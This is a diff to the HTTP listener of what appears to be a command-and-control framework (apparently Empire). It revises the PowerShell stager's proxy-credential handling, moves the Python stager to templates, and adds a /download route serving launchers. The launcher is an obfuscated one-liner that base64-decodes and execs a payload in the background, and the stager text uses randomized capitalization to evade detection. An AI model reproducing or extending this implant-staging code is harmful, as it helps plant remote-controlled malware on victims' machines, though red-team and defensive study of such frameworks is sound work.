@@ -14,6 +14,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
 
 
 class Listener:
@@ -259,20 +260,21 @@ class Listener:
                             # TODO: implement form for other proxy
                             stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                             stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                        if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
-                        else:
-                            # TODO: implement form for other proxy credentials
-                            username = proxyCreds.split(':')[0]
-                            password = proxyCreds.split(':')[1]
-                            if len(username.split('\\')) > 1:
-                                usr = username.split('\\')[1]
-                                domain = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                        if proxyCreds.lower() != 'none':
+                            if proxyCreds.lower() == "default":
+                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                             else:
-                                usr = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                                # TODO: implement form for other proxy credentials
+                                username = proxyCreds.split(':')[0]
+                                password = proxyCreds.split(':')[1]
+                                if len(username.split('\\')) > 1:
+                                    usr = username.split('\\')[1]
+                                    domain = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                                else:
+                                    usr = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
                         stager += "$Script:Proxy = $wc.Proxy;"
@@ -428,7 +430,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -518,29 +520,23 @@ class Listener:
                 return randomizedStager
 
         elif language.lower() == 'python':
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_path = os.path.join(self.mainMenu.installPath, 'data/agent/stagers')
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('http.py')
 
-            stager = helpers.strip_python_comments(stager)
+            template_options = {
+                    'working_hours': workingHours,
+                    'kill_date': killDate,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'stage_1': stage1,
+                    'stage_2': stage2
+                    }
 
-            if host.endswith("/"):
-                host = host[0:-1]
+            stager = template.render(template_options)
+            # TODO compress, minify, etc. with https://liftoff.github.io/pyminifier/
 
-            if workingHours != "":
-                stager = stager.replace('SET_WORKINGHOURS', workingHours)
-
-            if killDate != "":
-                stager = stager.replace('SET_KILLDATE', killDate)
-
-            # # patch the server and key information
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("REPLACE_PROFILE", profile)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            # # base64 encode the stager and return it
+            # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
             if encrypt:
@@ -823,11 +819,15 @@ def send_message(packets=None):
 
         @app.route('/download/<stager>')
         def send_stager(stager):
-            if stager:
+            if 'po' in stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
+            elif 'py' in stager:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
             else:
-                pass
+                return make_response(self.default_response(), 200)
+        
         @app.before_request
         def check_ip():
             """
